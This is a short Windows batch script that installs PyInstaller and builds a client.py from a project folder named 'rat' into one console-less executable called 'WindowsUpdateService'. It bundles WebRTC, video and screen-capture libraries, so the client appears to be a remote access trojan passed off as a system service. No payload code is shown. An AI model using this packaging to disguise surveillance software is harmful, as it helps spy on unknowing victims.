@echo off
echo [+] Checking for required packages...
"C:\Users\Abdulaziz\Desktop\Projects\rat\venv\Scripts\python.exe" -m pip install pyinstaller

echo [+] Building client executable...
"C:\Users\Abdulaziz\Desktop\Projects\rat\venv\Scripts\python.exe" -m pyinstaller --onefile --noconsole --name WindowsUpdateService --collect-all aiortc --collect-all av --collect-all dxcam client.py

echo [+] Build complete. Executable is in the 'dist' folder.
pause

